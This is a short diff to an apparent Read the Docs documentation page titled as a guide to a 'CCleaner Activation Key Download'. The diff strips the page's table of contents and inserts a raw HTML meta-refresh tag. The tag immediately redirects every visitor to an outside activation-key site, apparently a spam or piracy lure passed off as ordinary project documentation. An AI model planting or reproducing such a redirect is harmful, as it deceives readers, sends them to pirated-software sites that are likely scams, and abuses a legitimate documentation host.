@@ -1,11 +1,10 @@
+.. raw:: html
+ 
+    <meta http-equiv="refresh" content="0; url=https://activation-key.net/">
+
 CCleaner Activation Key Download: Everything You Need to Know 😊
 ============================================
-.
-.
 
-.. toctree::
-   :maxdepth: 2
-   :caption: Contents:
 
 .. image:: https://totaldefense-activate-subscription.readthedocs.io/en/latest/_images/activate.png
    :alt: My Project Logo
